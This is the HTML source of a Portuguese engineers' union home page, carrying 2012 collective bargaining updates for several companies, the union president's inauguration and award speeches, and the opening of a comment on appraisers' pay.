<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- Template version 2.0 for Joomla! 1.5.x -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pt-pt" lang="pt-pt" dir="ltr">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="robots" content="index, follow" />
  <meta name="keywords" content="Engenheiros, Portuguese Union Engineers, Portuguese Union, UGT Affiliate" />
  <meta name="description" content="SNE - Sindicato Nacional dos Engenheiros" />
  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
  <title>Sindicato Nacional dos Engenheiros - Início</title>
  <link href="/site/templates/jsn_epic_pro/favicon.ico" rel="shortcut icon" type="image/x-icon" />
  <script type="text/javascript" src="/site/media/system/js/mootools.js"></script>
  <script type="text/javascript" src="/site/media/system/js/caption.js"></script>

<link rel="shortcut icon" href="/site/images/favicon.ico" />
<link rel="stylesheet" href="/site/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="/site/templates/system/css/general.css" type="text/css" />
<link href="/site/templates/jsn_epic_pro/css/template.css" rel="stylesheet" type="text/css" media="screen" />
<link href="/site/templates/jsn_epic_pro/css/template_orange.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/css/jsn_iconlinks.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/cb/style.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/cb/style_orange.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/docman/style.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/docman/style_orange.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/vm/style.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/jevents/style.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/jevents/style_orange.css" rel="stylesheet" type="text/css" media="screen" /><link href="/site/templates/jsn_epic_pro/ext/rsg2/style.css" rel="stylesheet" type="text/css" media="screen" /><style type="text/css">
	#jsn-page {
		width: 960px;
	}
	
	#jsn-header {
		height: 100px;
	}
	
	#jsn-pinset {
		right: 86px;
	}
	
	#jsn-puser9 {
		float: left;
		width: 23%;
	}
	#jsn-pheader {
		float: left;
		width: 100%;
	}
	#jsn-puser8 {
		float: right;
		width: 23%;
	}
	
	#jsn-content_inner1 {
		background: transparent url(/site/templates/jsn_epic_pro/images/bg/leftside23-bg-full.png) repeat-y 23% top;
		padding: 0;
	}
	#jsn-maincontent_inner {
		padding-left: 0;
	}
	
	#jsn-leftsidecontent {
		float: left;
		width: 23%;
	}
	#jsn-maincontent {
		float: left;
		width: 76.94%;
	}
	#jsn-rightsidecontent {
		float: right;
		width: 23%;
	}
	
			ul.menu-icon li.order1 a:link,
			ul.menu-icon li.order1 a:visited {
				background-image: url("http://www.sne.pt/site/templates/jsn_epic_pro/images/icon-module-home.png");
			}
			
			ul.menu-icon li.order2 a:link,
			ul.menu-icon li.order2 a:visited {
				background-image: url("http://www.sne.pt/site/templates/jsn_epic_pro/images/icon-module-info.png");
			}
			
			ul.menu-icon li.order3 a:link,
			ul.menu-icon li.order3 a:visited {
				background-image: url("http://www.sne.pt/site/templates/jsn_epic_pro/images/icon-module-image.png");
			}
			
			ul.menu-icon li.order4 a:link,
			ul.menu-icon li.order4 a:visited {
				background-image: url("http://www.sne.pt/site/templates/jsn_epic_pro/images/icon-module-download.png");
			}
			
			ul.menu-icon li.order5 a:link,
			ul.menu-icon li.order5 a:visited {
				background-image: url("http://www.sne.pt/site/templates/jsn_epic_pro/images/icon-module-mail.png");
			}
			
			ul.menu-icon li.order6 a:link,
			ul.menu-icon li.order6 a:visited {
				background-image: url("http://www.sne.pt/site/templates/jsn_epic_pro/images/icon-module-comment.png");
			}
			
	#jsn-master {
		font-size: 75%;
		font-family: Arial, Helvetica, sans-serif;
	}
	
	h1, h2, h3, h4, h5, h6,
	ul.menu-suckerfish a,
	.componentheading, .contentheading {
		font-family: Verdana, Geneva, sans-serif !important;
	}
	</style><script type="text/javascript" src="/site/templates/jsn_epic_pro/js/jsn_script.js"></script>
	<script type="text/javascript">
		var defaultFontSize = 75;
	</script>
	<script type="text/javascript" src="/site/templates/jsn_epic_pro/js/jsn_epic.js"></script>
	<!--[if lte IE 6]>
<link href="/site/templates/jsn_epic_pro/css/jsn_fixie6.css" rel="stylesheet" type="text/css" />
<style type="text/css">
	img {  behavior: url(/site/templates/jsn_epic_pro/js/iepngfix.htc); }
</style>
<![endif]-->
<!--[if lte IE 7]>
<script type="text/javascript" src="/site/templates/jsn_epic_pro/js/suckerfish.js"></script>
<![endif]-->
<!--[if IE 7]>
<link href="/site/templates/jsn_epic_pro/css/jsn_fixie7.css" rel="stylesheet" type="text/css" />
<![endif]-->
</head>
<body id="jsn-master">
	<div id="jsn-page">
		<div id="jsn-header">
			<div id="jsn-logo"><a href="/site/index.php" title="Sindicato Nacional dos Engenheiros"><img src="/site/templates/jsn_epic_pro/images/logo.png" width="333" height="100" alt="Sindicato Nacional dos Engenheiros" /></a></div>
			<script type="text/javascript" src="http://www.myplantz.de/counter.php?id=5081403"></script>			<div id="jsn-ptop">		<div class="moduletable">
					<ul class="menu" />		</div>
	</div>
					</div>
		<div id="jsn-body">
						<div id="jsn-mainmenu">
																<div id="jsn-fontresizer">
					<ul class="hlist">
						<li><a onclick="jsnChangeFontSize(-1);" title="Decrease font size" href="javascript:void(0)"><img alt="Decrease font size" src="/site/templates/jsn_epic_pro/images/font-decrease.png"/></a></li>
						<li><a onclick="jsnResetFontSize();" title="Reset font size to default" href="javascript:void(0)"><img alt="Reset font size to default" src="/site/templates/jsn_epic_pro/images/font-reset.png"/></a></li>
						<li><a onclick="jsnChangeFontSize(1);" title="Increase font size" href="javascript:void(0)"><img alt="Increase font size" src="/site/templates/jsn_epic_pro/images/font-increase.png"/></a></li>
					</ul>
				</div>
							</div>
									<div id="jsn-promo">
												<div id="jsn-pheader" class="jsn-column"></div>
												<div class="clearbreak"></div>
			</div>
						<div id="jsn-content"><div id="jsn-content_inner1"><div id="jsn-content_inner2">
								<div id="jsn-leftsidecontent" class="jsn-column">
					<div id="jsn-pleft">		<div class="module_menu">
			<div>
				<div>
					<div>
													<h3>Menu</h3>
											<ul class="menu"><li class="item45 order2 first"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=16&amp;Itemid=45"><span>Corpos Dirigentes</span></a></li><li class="item21 order4"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=11&amp;Itemid=21"><span>Inscrição SNEET</span></a></li><li class="active item14 order5 current"><a href="http://www.sne.pt/site/" class="current"><span>Início</span></a></li><li class="parent item15 order7"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=16&amp;Itemid=15"><span>O SNEET</span></a></li><li class="parent item17 order8"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=8&amp;Itemid=17"><span>Contratação</span></a></li><li class="parent item9 order10"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=4&amp;Itemid=9"><span>Dep.Jurídico</span></a></li><li class="item18 order11"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=12&amp;Itemid=18"><span>Benefícios</span></a></li><li class="item7 order12"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=7&amp;Itemid=7"><span>Cursos</span></a></li><li class="item12 order13"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=6&amp;Itemid=12"><span>Livros</span></a></li><li class="item4 order14"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=10&amp;Itemid=4"><span>Viagens</span></a></li><li class="item19 order15"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=18&amp;Itemid=19"><span>Downloads</span></a></li><li class="item10 order16 last"><a href="/site/index.php?option=com_content&amp;view=article&amp;id=3&amp;Itemid=10"><span>Contactos</span></a></li></ul>					</div>
				</div>
			</div>
		</div>
			<div class="module">
			<div>
				<div>
					<div>
													<h3>Pesquisar no site</h3>
											<form action="index.php" method="post">
	<div class="search">
		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="OK" class="inputbox" type="text" size="20" value="Pesquisar..."  onblur="if(this.value=='') this.value='Pesquisar...';" onfocus="if(this.value=='Pesquisar...') this.value='';" /><input type="image" value="OK" class="button" src="/site/images/M_images/searchButton.gif" onclick="this.form.searchword.focus();"/>	</div>
	<input type="hidden" name="task"   value="search" />
	<input type="hidden" name="option" value="com_search" />
	<input type="hidden" name="Itemid" value="14" />
</form>					</div>
				</div>
			</div>
		</div>
	</div>
				</div>
								<div id="jsn-maincontent" class="jsn-column"><div id="jsn-maincontent_inner">
										<div id="jsn-pathway"></div>
															<div id="jsn-mainbody">
						
						<table class="contentpaneopen">
<tr>
						<td align="right" width="100%" class="buttonheading">
		<a href="/site/index.php?view=article&amp;catid=1:estaticos&amp;id=13:inicio&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/site/templates/jsn_epic_pro/images/pdf_button.png" alt="PDF"  /></a>		</td>
		
				<td align="right" width="100%" class="buttonheading">
		<a href="/site/index.php?view=article&amp;catid=1:estaticos&amp;id=13:inicio&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Versão para impressão" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/site/templates/jsn_epic_pro/images/printButton.png" alt="Versão para impressão"  /></a>		</td>
		
					</tr>
</table>

<table class="contentpaneopen">



<tr>
<td valign="top">
<div>
<table class="text" style="width: 497px; height: 1656px;" border="0">
<tbody>
<tr>
<td style="text-align: justify;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />
<p style="text-align: center;" data-mce-style="text-align: center;"> </p>
<p style="text-align: center;"><strong><em>Novo Site</em></strong></p>
<p style="text-align: center;"><strong><em>Sindicato Nacional dos Engenheiros, Engenheiros Técnicos e Arquitectos</em></strong></p>
<p style="text-align: center;"><span style="-webkit-tap-highlight-color: rgba(26, 26, 26, 0.296875); -webkit-composition-fill-color: rgba(175, 192, 227, 0.230469); -webkit-composition-frame-color: rgba(77, 128, 180, 0.230469);"><span style="color: #ff9900;"><span style="font-size: 14pt;">Clique para ver&nbsp;</span></span><a href="http://www.sneet.pt/"><span style="color: #0000ff;"><span style="font-size: 24pt;"><em><strong>www.sneet.pt</strong></em></span></span></a></span></p>
<p align="center"> </p>
<p align="center"><strong>Código do Trabalho - Índice</strong></p>
<p align="center"> </p>
<p align="center"><a href="http://www.cite.gov.pt/pt/legis/CodTrab_indice.html" target="qCkcb75SZhxQGRpBKeYn3TA"><span style="color: #0000ff;"><strong>Link&nbsp;</strong></span> http://www.cite.gov.pt/pt/legis/CodTrab_indice.html</a></p>
<p align="center"> </p>
<p align="center"> </p>
<p align="center"> </p>
<p align="center"><strong>CONTRATAÇÃO COLETIVA</strong></p>
<p align="center"><strong> </strong></p>
<p align="center">Acordos negociados e em curso em 2012</p>
<p align="center"> </p>
<p><strong>EDP</strong> – As negociações iniciaram-se com uma proposta da Empresa de aumento salarial de 0,8%, apenas na renumeração base, para todos os trabalhadores com uma remuneração base inferior a 2.000 euros, não abrangendo qualquer cláusula de expressão pecuniária.</p>
<p>Findas as negociações, o acordo obtido contemplou um aumento para todos os níveis da tabela salarial de 1,7% (arredondado ao euro superior) e 1,7% para as cláusulas de expressão pecuniária (sem arredondamento).</p>
<p>O subsídio de alimentação será pago em dinheiro, senhas ou cartão específico fornecido pela empresa, por opção do trabalhador.</p>
<p>Foi ainda acordado, entre outras matérias menos relevantes, um prémio de produtividade no valor de 173 euros e distribuição de resultados de 50% da remuneração, para todos, desde que satisfeitas as condicionantes da avaliação individual.</p>
<p> </p>
<p><strong>PETROGAL, GDL e PETROLÍFERAS PRIVADAS</strong> – A situação de partida era de recusa de qualquer aumento salarial, invocando o grupo a situação de crise que o país atravessa, que se reflete numa contínua retração do consumo de combustíveis e numa acentuada redução da margem de refinação, que em 2011 foi negativa, acrescido dos fortes investimentos realizados pela Petrogal na reformulação do aparelho refinador e no desenvolvimento da atividade de exploração e produção petrolífera.</p>
<p>No entanto, a Empresa foi sensível à contra argumentação dos sindicatos e assim foi acordado um aumento salarial de 1% abrangendo a tabela e as cláusulas de expressão pecuniária entre as quais o subsídio de alimentação.</p>
<p>A <strong>GDL</strong> e as <strong>PETROLÍFERAS PRIVADAS </strong>acompanharam.</p>
<p> </p>
<p><strong>PT</strong> – O SNEET assinou o ACT das empresas <strong>PT, PT Prime e TMN</strong> (parte do clausulado), o qual substitui o anterior AE que apenas respeitava à PT, clarificadas que foram pela Empresa as objeções levantadas e oportunamente transmitidas aos nossos associados do grupo PT.</p>
<p>Decorrem as negociações quanto ao restante clausulado e eventual revisão da tabela e restantes cláusulas de expressão pecuniária.</p>
<p> </p>
<p><strong>ADP Fertilizantes</strong> – Foi revisto e acordado o clausulado do anterior AE, decorrendo agora as negociações da tabela salarial, &nbsp;tendo a Empresa evoluído de 1% para 1,3%, considerando-se que poderá ainda haver uma evolução positiva.</p>
<p> </p>
<p><strong>TABAQUEIRA</strong> – A Empresa propõe um aumento salarial de 1% mas faz depender da redução de regalias sociais no centro infanto-juvenil (creche e ATL), nos transportes e no seguro de saúde.</p>
<p>Decorrem as negociações com vista à redução do impacto destes cortes e maior aumento na tabela.</p>
<p> </p>
<p><strong>RTP</strong> – A nova Administração reuniu com os Sindicatos em Janeiro para se apresentar, informando que estavam em curso os estudos com vista à reestruturação e que seriam fornecidas informações nomeadamente quanto à criação de uma nova empresa de serviços técnicos, rescisões por mútuo acordo e outras medidas de saneamento financeiro.</p>
<p>O SNEET juntamente com outros sindicatos tem insistido junto da Administração para a clarificação destes e outros aspectos.</p>
<p> </p>
<p><strong>CTT</strong> – Decorrem as negociações do clausulado de um novo AE, visto a Empresa pretender reunir num único AE os dois AE atualmente existentes, os chamados AE de Janeiro e de Setembro, conforme as organizações sindicais abrangidas por eles.</p>
<p> </p>
<p><strong>PORTUCEL</strong> – Estão em curso as negociações para a revisão do AE existente, denunciado pela empresa, com o pretexto de adaptação à legislação mais atual, o que tem levantado fortes protestos por parte dos trabalhadores tendo até conduzido à greve.</p>
<p>Também está em negociação a revisão da tabela salarial, tendo a empresa feito uma primeira proposta de 0,6%.</p>
<p> </p>
<p><strong>AECOPS</strong> – Início das negociações prevista para Maio.</p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"><span style="-webkit-tap-highlight-color: rgba(26, 26, 26, 0.296875); -webkit-composition-fill-color: rgba(175, 192, 227, 0.230469); -webkit-composition-frame-color: rgba(77, 128, 180, 0.230469);"><span style="color: #0000ff;"><span style="font-size: 24pt;"><em><strong><br /></strong></em></span></span></span></p>
<h3 style="text-align: center;">Tomada de posse dos novos corpos gerentes</h3>
<p style="text-align: center;"> </p>
<p style="text-align: center;"><em><strong>Discurso do&nbsp;Senhor Presidente da Direcção</strong></em></p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"><em><strong><img src="/site/images/nova.JPG" height="299" width="172" /></strong></em></p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Exmº Sr. Engº <strong>João Lourenço Martins de Oliveira Pinto</strong></span></em></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Caros Colegas</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Quero começar por agradecer aos Associados a </span></strong><strong><span style="font-size: 14pt;">confiança manifestada nas urnas para que durante os </span></strong><strong><span style="font-size: 14pt;">próximos 4 anos fiquemos à frente dos destinos do </span></strong><strong><span style="font-size: 14pt;">Sindicato Nacional dos Engenheiros, Engenheiros Técnicos </span></strong><strong><span style="font-size: 14pt;">e Arquitectos.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Quero agradecer aos Colegas que, por uma razão ou outra, </span></strong><strong><span style="font-size: 14pt;">deixaram de pertencer aos Corpos Gerentes. A dignidade </span></strong><strong><span style="font-size: 14pt;">com que desempenharam as funções que lhes foram </span></strong><strong><span style="font-size: 14pt;">atribuídas, e o seu trabalho na defesa e prestígio dos </span></strong><strong><span style="font-size: 14pt;">Associados são de enaltecer.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Quero cumprimentar todos os colaboradores do Sindicato </span></strong><strong><span style="font-size: 14pt;">cuja competência e dedicação é de louvar.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Muito Obrigado.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Conto convosco.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Quero cumprimentar os Corpos Gerentes que acabaram de </span></strong><strong><span style="font-size: 14pt;">tomar posse e dar um abraço muito especial às “caras </span></strong><strong><span style="font-size: 14pt;">novas”: Célia Maia, Ana Mestre, Nuno da Câmara Pereira, </span></strong><strong><span style="font-size: 14pt;">Luís Vaz, Hugo Deodato, Carlos Pereira, José Gonçalves </span></strong><strong><span style="font-size: 14pt;">Coelho, Rui Pires, Nuno Tempera, Hélder Valério e João de </span></strong><strong><span style="font-size: 14pt;">Deus, com cuja renovação de ideias e de vontades conto </span></strong><strong><span style="font-size: 14pt;">para concretizar os nossos objectivos programáticos.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Todos sabemos que o País está em crise e os Sindicatos, </span></strong><strong><span style="font-size: 14pt;">em especial o nosso, que é um Sindicato de Quadros, será </span></strong><strong><span style="font-size: 14pt;">muito afectado pela mesma.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Por um lado os Sindicatos em tempo de crise, têm uma </span></strong><strong><span style="font-size: 14pt;">maior visibilidade, pois conseguem mobilizar as pessoas </span></strong><strong><span style="font-size: 14pt;">que pretendem atenuar os efeitos das medidas de </span></strong><strong><span style="font-size: 14pt;">austeridade.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Por outro lado o aumento do desemprego, o agravamento </span></strong><strong><span style="font-size: 14pt;">das desigualdades, o baixo poder de compra e o corte nos </span></strong><strong><span style="font-size: 14pt;">rendimentos do Trabalho afectarão negativamente os </span></strong><strong><span style="font-size: 14pt;">Sindicatos, pelo facto de a sindicalização diminuir .</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">No nosso Sindicato não são tanto os pedidos de demissão </span></strong><strong><span style="font-size: 14pt;">que nos afectam são os associados que deixam de pagar a </span></strong><strong><span style="font-size: 14pt;">quotização, é a quotização em atraso.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">Dentro do meu ponto de vista, considero que neste </span></strong><strong><span style="font-size: 14pt;">momento há duas formas de tentar minimizar este impacto </span></strong><strong><span style="font-size: 14pt;">da crise, esta dualidade contraditória.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">A primeira é termos uma equipa constituída pelos melhores </span></strong><strong><span style="font-size: 14pt;">dos melhores, julgo que a temos, olhando para os </span></strong><strong><span style="font-size: 14pt;">presentes verifica-se facilmente que assim é e podemos </span></strong><strong><span style="font-size: 14pt;">reafirmar com toda a justiça que irão desempenhar um </span></strong><strong><span style="font-size: 14pt;">papel fundamental na recuperação e futuro do nosso </span></strong><strong><span style="font-size: 14pt;">Sindicato.</span></strong></p>
<p style="text-align: justify;"><strong><span style="font-size: 14pt;">A segunda é dignificar as nossas referências, pois sem </span></strong><span style="font-size: 14pt;"><strong>referências não há instituições que consigam resistir às </strong><strong>crises.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Vamos aproveitar o facto de estarmos hoje aqui reunidos </strong></span><span style="font-size: 14pt;"><strong>para homenagear os nossos colegas que não puderam </strong></span><span style="font-size: 14pt;"><strong>estar em Peniche.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Esta Cerimónia Privada que se vai realizar, tem a mesma</strong></span><span style="font-size: 14pt;"><strong>dignidade da Cerimónia Publica, em nada lhe fica atrás.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;">&nbsp;</span><span style="font-size: 14pt;"><strong>Agradeço aos Protectores do Conselho dos Notáveis </strong></span><span style="font-size: 14pt;"><strong>presentes neste salão, que se identifiquem colocando o </strong></span><span style="font-size: 14pt;"><strong>respectivo Colar.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;">&nbsp;</span><span style="font-size: 14pt;"><strong>Gostaria de dizer algumas palavras aos Homenageados.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Caros Homenageados</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Nesta época de todas as crises, o nosso modesto</strong></span><span style="font-size: 14pt;"><strong>contributo é agir com optimismo, esperança e reconhecer</strong></span><span style="font-size: 14pt;"><strong>os Homens e Mulheres de bons costumes, que se têm</strong></span><span style="font-size: 14pt;"><strong>esforçado por defender o Trabalho Ilustre, Duro e </strong></span><span style="font-size: 14pt;"><strong>Esclarecido.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Esta Homenagem, que vos é atribuída, é para nós, de uma </strong></span><span style="font-size: 14pt;"><strong>grande importância, por expressar o reconhecimento </strong></span><span style="font-size: 14pt;"><strong>público pelo valoroso e abnegado trabalho, dedicado à </strong></span><span style="font-size: 14pt;"><strong>engenharia, Arquitectura ou Engrandecimento do Sindicato, </strong></span><span style="font-size: 14pt;"><strong>ao longo da vossa vida.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Atingistes o nível sublime de serdes uma referência </strong></span><span style="font-size: 14pt;"><strong>respeitada e voltada para os anseios da Sociedade.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>As pessoas e as Instituições, precisam de referências que </strong></span><span style="font-size: 14pt;"><strong>lhes dêem segurança, permanência e estabilidade, num </strong></span><span style="font-size: 14pt;"><strong>mundo cada vez mais inseguro, dinâmico e mutável.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>As referências realizam o milagre de trazer ao de cima a </strong></span><span style="font-size: 14pt;"><strong>experiência da Comunidade e a alegria de merecerem a </strong></span><span style="font-size: 14pt;"><strong>nossa admiração, pelos valores que representam.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>É uma honra para mim estar aqui, neste “Salão Nobre Engº </strong></span><span style="font-size: 14pt;"><strong>Ferreira da Costa”, não só para entregar esta distinção aos </strong></span><span style="font-size: 14pt;"><strong>Homenageados em meu nome, mas porque também o faço </strong></span><span style="font-size: 14pt;"><strong>em nome de todos os que cultivam o sentimento da </strong></span><span style="font-size: 14pt;"><strong>gratidão e exaltam o reconhecimento e o mérito.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>Este é mais um momento Histórico, que será lembrado com </strong></span><span style="font-size: 14pt;"><strong>júbilo, no amanhã da nossa Instituição e as gerações </strong></span><span style="font-size: 14pt;"><strong>futuras de Engenheiros, Engenheiros Técnicos e </strong></span><span style="font-size: 14pt;"><strong>Arquitectos aplaudirão.</strong></span></p>
<p style="text-align: justify;"><span style="font-size: 14pt;"><strong>&nbsp;</strong></span></p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"><span style="font-size: 18pt;"><strong>HOMENAGEM</strong></span></p>
<p> </p>
<p><strong><span style="font-size: 10pt;"><em>ENTREGA&nbsp; DO TITULO DE"PROTECTOR DO CONSELHO DOS NOTÁVEIS"</em></span></strong></p>
<p><img src="/site/../recursos/SNE.jpg" style="float: left;" height="144" width="92" /></p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"> </p>
<p style="text-align: center;"> </p>
<p style="text-align: justify;"><span style="font-size: 8pt;">&nbsp;I</span><span style="font-size: 8pt;">ntervenção do Senhor Presidente da Direcção e "Grande Protector do Conselho</span><em><span style="font-size: 8pt;">&nbsp;</span></em></p>
<p style="text-align: justify;"><em><span style="font-size: 8pt;">&nbsp;dos Notáveis",</span></em><em><span style="font-size: 8pt;">&nbsp;</span></em><span style="font-size: 8pt;">&nbsp;</span><span style="font-size: 8pt;">&nbsp;</span><span style="font-size: 8pt;">Exmº</span><strong><span style="font-size: 8pt;"> </span></strong><span style="font-size: 8pt;">Senhor Engº</span><strong><span style="font-size: 8pt;"> João Lourenço Martins de Oliveira Pinto</span></strong></p>
<p> </p>
<p> </p>
<p> </p>
<p><strong><em><span style="font-size: 10pt;">Caros Colegas</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Exmªs Senhoras e Senhores</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Exmºs Convidados</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;"><br /></span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">O Sindicato Nacional dos Engenheiros, Engenheiros Técnicos e Arquitectos é uma Instituição cujas origens têm mais de 150 anos. Foi criado em 1942, por reconversão do Grémio Técnico Português, fundado em 1860.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Sempre estivemos&nbsp; atentos aos momentos culminantes da Sociedade e empreendemos lutas renhidas, em favor das legítimas aspirações dos nossos Associados.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Todos estamos cientes dos desafios importantes que atravessamos, desde o desafio da crise de energia até ao abrandamento da economia mundial. Incertezas de ordem financeira que abalam, neste momento, o nosso País.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">O que temos de fazer é, a despeito desta adversidade, em função do facto de que sofremos muito mais as consequências dessas transformações, do que somos nós próprios os autores delas.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">É ter confiança e entender que seremos capazes de contribuir para defender os nossos interesses, em qualquer circunstância.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Hoje, o nosso modesto contributo é agir com optimismo, esperança e reconhecer os Homens e Mulheres de bons costumes, que se têm esforçado por defender o Trabalho Ilustre, Duro e Esclarecido.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Esta Homenagem, que vos é atribuída, é para nós, de uma grande importância, por expressar o reconhecimento público pelo valoroso e abnegado trabalho, dedicado à engenharia ao longo da vossa vida.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Atingistes o nível sublime de serdes uma referência respeitada e voltada para os anseios da Sociedade.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">As pessoas e as Instituições, precisam de referências que lhes dêem segurança, permanência e estabilidade, num mundo cada vez mais inseguro, dinâmico e mutável.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">As referências realizam o milagre de trazer ao de cima a experiência da Comunidade e a alegria de merecerem a nossa admiração, pelos valores que representam.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">É uma honra para mim estar aqui em Peniche, neste Auditório, não só para entregar esta distinção aos Homenageados em meu nome, mas porque também o faço em nome de todos os que cultivam o sentimento da gratidão e exaltam o reconhecimento e o mérito.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Este é um momento Histórico, que será lembrado com júbilo, no amanhã da nossa Instituição e as gerações futuras de Engenheiros, Engenheiros Técnicos e Arquitectos aplaudirão.</span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;"><br /></span></em></strong></p>
<p><strong><em><span style="font-size: 10pt;">Disse.</span></em></strong></p>
<p><a href="/site/../recursos/SNE_400.jpg"><img src="/site/../recursos/SNE%20-345.jpg" height="307" width="481" /></a></p>
<p><span style="color: #3366ff;"><strong><a href="http://www.flickr.com/photos/paulomuinos/sets/72157629559990683/">FOTOS DA CERIMÔNIA-CLIQUE PARA VER</a></strong></span></p>
<p> </p>
<p><span style="color: #3366ff;"><strong><br /></strong></span></p>
<h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;&nbsp; <em>Peritos Avaliadores</em></h1>
<p> </p>
<p>O <strong>Sindicato Nacional dos Engenheiros, Engenheiros Técnicos e Arquitectos</strong> tece os seguintes comentários à aplicação da circular n.º 4/2012 de 23 de Fevereiro, da Autoridade Tributária e Aduaneira, relativa a tabela de remunerações dos peritos avaliadores locais;</p>
<p><em>&nbsp;</em></p>
<p><em>&nbsp;</em></p>
<p>1 – Incompreensivelmente a referida tabela deprecia a remuneração dos peritos avaliadores locais em 36.8 % dos valores fixados na última tabela publicada em Junho de 2011, tabela esta que era já inferior à de Junho de 2009;</p>
<p> </p>
